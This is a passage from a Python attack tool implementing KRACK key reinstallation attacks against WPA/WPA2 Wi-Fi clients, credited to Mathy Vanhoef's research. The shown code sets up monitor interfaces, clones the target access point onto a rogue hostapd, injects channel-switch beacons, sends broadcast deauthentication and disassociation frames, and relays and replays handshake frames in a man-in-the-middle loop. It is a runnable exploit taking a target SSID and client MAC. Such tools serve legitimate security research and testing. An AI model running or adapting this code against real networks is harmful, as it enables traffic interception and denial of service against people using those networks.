                        p.FCfield &= 0xFFEF

                    self.sock_real.send(p)


        # 3. Always display all frames sent by or to the targeted client
        elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
            print_rx(INFO, "Rogue channel", p)

    def handle_hostapd_out(self):
        # hostapd always prints lines so this should not block
        line = self.hostapd.stdout.readline().decode('utf-8')
        if line == "":
            log(ERROR, "Rogue hostapd instances unexpectedly closed")
            quit(1)

        if line.startswith(">>>> "):
            log(STATUS, "Rogue hostapd: " + line[5:].strip())
        elif line.startswith(">>> "):
            log(DEBUG, "Rogue hostapd: " + line[4:].strip())
        # This is a bit hacky but very usefull for quick debugging
        elif "fc=0xc0" in line:
            log(WARNING, "Rogue hostapd: " + line.strip())
        elif "sta_remove" in line or "Add STA" in line or "disassoc cb" in line or "disassocation: STA" in line:
            log(DEBUG, "Rogue hostapd: " + line.strip())
        else:
            log(ALL, "Rogue hostapd: " + line.strip())

        self.hostapd_log.write(datetime.now().strftime('[%H:%M:%S] ') + line)

    def configure_interfaces(self):
        # 0. Warn about common mistakes
        log(STATUS, "Note: remember to disable Wi-Fi in your network manager so it doesn't interfere with this script")
        # This happens when targetting a specific client: both interfaces will ACK frames from each other due to the capture
        # effect, meaning certain frames will not reach the rogue AP or the client. As a result, the client will disconnect.
        log(STATUS,
            "Note: keep >1 meter between both interfaces. Else packet delivery is unreliable & target may disconnect")

        # 1. Remove unused virtual interfaces
        subprocess.call(["iw", self.nic_real + "sta1", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
        if self.nic_rogue_mon is None:
            subprocess.call(["iw", self.nic_rogue_ap + "mon", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)

        # 2. Configure monitor mode on interfaces
        subprocess.check_output(["ifconfig", self.nic_real, "down"])
        subprocess.check_output(["iw", self.nic_real, "set", "type", "monitor"])
        if self.nic_rogue_mon is None:
            self.nic_rogue_mon = self.nic_rogue_ap + "mon"
            subprocess.check_output(
                ["iw", self.nic_rogue_ap, "interface", "add", self.nic_rogue_mon, "type", "monitor"])
            # Some kernels (Debian jessie - 3.16.0-4-amd64) don't properly add the monitor interface. The following ugly
            # sequence of commands to assure the virtual interface is registered as a 802.11 monitor interface.
            subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
            time.sleep(0.2)
            subprocess.check_output(["ifconfig", self.nic_rogue_mon, "down"])
            subprocess.check_output(["iw", self.nic_rogue_mon, "set", "type", "monitor"])
            subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])

        # 3. Configure interface on real channel to ACK frames
        if self.clientmac:
            self.nic_real_clientack = self.nic_real + "sta1"
            subprocess.check_output(
                ["iw", self.nic_real, "interface", "add", self.nic_real_clientack, "type", "managed"])
            call_macchanger(self.nic_real_clientack, self.clientmac)
        else:
            # Note: some APs require handshake messages to be ACKed before proceeding (e.g. Broadcom waits for ACK on Msg1)
            log(WARNING,
                "WARNING: Targeting ALL clients is not fully supported! Please provide a specific target using --target.")
            # Sleep for a second to make this warning very explicit
            time.sleep(1)

        # 4. Finally put the interfaces up
        subprocess.check_output(["ifconfig", self.nic_real, "up"])
        subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])

    def run(self, strict_echo_test=False):
        self.configure_interfaces()

        # Make sure to use a recent backports driver package so we can indeed
        # capture and inject packets in monitor mode.
        self.sock_real = MitmSocket(type=ETH_P_ALL, iface=self.nic_real, dumpfile=self.dumpfile,
                                    strict_echo_test=strict_echo_test)
        self.sock_rogue = MitmSocket(type=ETH_P_ALL, iface=self.nic_rogue_mon, dumpfile=self.dumpfile,
                                     strict_echo_test=strict_echo_test)

        # Test monitor mode and get MAC address of the network
        self.find_beacon(self.ssid)
        if self.beacon is None:
            log(ERROR,
                "No beacon received of network <%s>. Is monitor mode working? Did you enter the correct SSID?" % self.ssid)
            return
        # Parse beacon and used this to generate a cloned hostapd.conf
        self.netconfig = NetworkConfig()
        self.netconfig.from_beacon(self.beacon)
        if not self.netconfig.is_wparsn():
            log(ERROR, "Target network is not an encrypted WPA or WPA2 network, exiting.")
            return
        elif self.netconfig.real_channel > 13:
            log(WARNING, "Attack not yet tested against 5 GHz networks.")
        self.netconfig.find_rogue_channel()

        log(STATUS, "Target network %s detected on channel %d" % (self.apmac, self.netconfig.real_channel),
            color="green")
        log(STATUS, "Will create rogue AP on channel %d" % self.netconfig.rogue_channel, color="green")

        # Set the MAC address of the rogue hostapd AP
        log(STATUS, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.apmac))
        set_mac_address(self.nic_rogue_ap, self.apmac)

        # Put the client ACK interface up (at this point switching channels on nic_real may no longer be possible)
        if self.nic_real_clientack: subprocess.check_output(["ifconfig", self.nic_real_clientack, "up"])

        # Set BFP filters to increase performance
        bpf = "(wlan addr1 {apmac}) or (wlan addr2 {apmac})".format(apmac=self.apmac)
        if self.clientmac:
            bpf += " or (wlan addr1 {clientmac}) or (wlan addr2 {clientmac})".format(clientmac=self.clientmac)
        bpf = "(wlan type data or wlan type mgt) and (%s)" % bpf
        self.sock_real.attach_filter(bpf)
        self.sock_rogue.attach_filter(bpf)

        # Set up a rouge AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
        with open("hostapd_rogue.conf", "w") as fp:
            fp.write(self.netconfig.write_config(self.nic_rogue_ap))
        self.hostapd = subprocess.Popen(["../hostapd/hostapd", "hostapd_rogue.conf", "-dd", "-K"],
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.hostapd_log = open("hostapd_rogue.log", "w")

        log(STATUS, "Giving the rogue hostapd one second to initialize ...")
        time.sleep(1)

        self.hostapd_ctrl = Ctrl("hostapd_ctrl/" + self.nic_rogue_ap)
        self.hostapd_ctrl.attach()

        # Inject some CSA beacons to push victims to our channel
        self.send_csa_beacon(numbeacons=4)

        # Try to deauthenticated all clients
        deauth = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.apmac, addr3=self.apmac) / Dot11Deauth(reason=3)
        self.sock_real.send(deauth)

        # For good measure, also queue a dissasociation to the targeted client on the rogue channel
        if self.clientmac:
            self.queue_disas(self.clientmac)

        # Continue attack by monitoring both channels and performing needed actions
        self.last_real_beacon = time.time()
        self.last_rogue_beacon = time.time()
        nextbeacon = time.time() + 0.01
        while True:
            sel = select.select([self.sock_rogue, self.sock_real, self.hostapd.stdout], [], [], 0.1)
            if self.sock_real in sel[0]: self.handle_rx_realchan()
            if self.sock_rogue in sel[0]: self.handle_rx_roguechan()
            if self.hostapd.stdout in sel[0]: self.handle_hostapd_out()

            if self.time_forward_group1 and self.time_forward_group1 <= time.time():
                p = self.group1.pop(0)
                self.sock_rogue.send(p)
                self.time_forward_group1 = None
                log(STATUS, "Injected older group message 1: %s" % dot11_to_str(p), color="green")

            while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
                self.send_disas(self.disas_queue.pop()[1])

            if self.continuous_csa and nextbeacon <= time.time():
                self.send_csa_beacon(silent=True)
                nextbeacon += 0.10

            if self.last_real_beacon + 2 < time.time():
                log(WARNING, "WARNING: Didn't receive beacon from real AP for two seconds")
                self.last_real_beacon = time.time()
            if self.last_rogue_beacon + 2 < time.time():
                log(WARNING, "WARNING: Didn't receive beacon from rogue AP for two seconds")
                self.last_rogue_beacon = time.time()

    def stop(self):
        log(STATUS, "Closing hostapd and cleaning up ...")
        if self.hostapd:
            self.hostapd.terminate()
            self.hostapd.wait()
        if self.hostapd_log:
            self.hostapd_log.close()
        if self.sock_real: self.sock_real.close()
        if self.sock_rogue: self.sock_rogue.close()


def cleanup():
    attack.stop()


if __name__ == "__main__":
    description = textwrap.dedent(
        """\
        
        █ ▗ █ ▀ ▁▁ ▊▀▀ ▀    ▉▁▁█ ▗▛▚  ▟▔▀▬ ▉ ▟▛ 
        ▜▄▀▄▘ ▊ ▔▔ █▔▔ ▊    █▔ ▊ █▔▔▊ ▜▄▃▞ █▔▚▃ 
		
        Based on: Key Reinstallation Attacks (KRACKs) by Mathy Vanhoef
		-----------------------------------------------------------
        """)
    parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)

    # Required arguments
    parser.add_argument("nic_real_mon",
                        help="Wireless monitor interface that will listen on the channel of the target AP.")
    parser.add_argument("nic_rogue_ap",
                        help="Wireless monitor interface that will run a rogue AP using a modified hostapd.")
    parser.add_argument("ssid", help="The SSID of the network to attack.")

    # Optional arguments
    parser.add_argument("-m", "--nic-rogue-mon",
                        help="Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.")
    parser.add_argument("-t", "--target", help="Specifically target the client with the given MAC address.")
    parser.add_argument("-p", "--dump", help="Dump captured traffic to the pcap files <this argument name>.<nic>.pcap")
    parser.add_argument("-d", "--debug", action="count", help="increase output verbosity", default=0)
    parser.add_argument("--strict-echo-test", help="Never treat frames received from the air as echoed injected frames",
                        action='store_true')
    parser.add_argument("--continuous-csa", help="Continuously send CSA beacons on the real channel (10 every second)",
                        action='store_true')
    parser.add_argument("--group", help="Perform attacks on the group key handshake only", action='store_true')

    args = parser.parse_args()

    global_log_level = max(ALL, global_log_level - args.debug)

    print("\n\t===[ KRACK Attacks against Linux/Android by Mathy Vanhoef ]===\n")
    attack = KRAckAttack(args.nic_real_mon, args.nic_rogue_ap, args.nic_rogue_mon, args.ssid, args.target, args.dump,
                         args.continuous_csa)
    atexit.register(cleanup)
    attack.run(strict_echo_test=args.strict_echo_test)

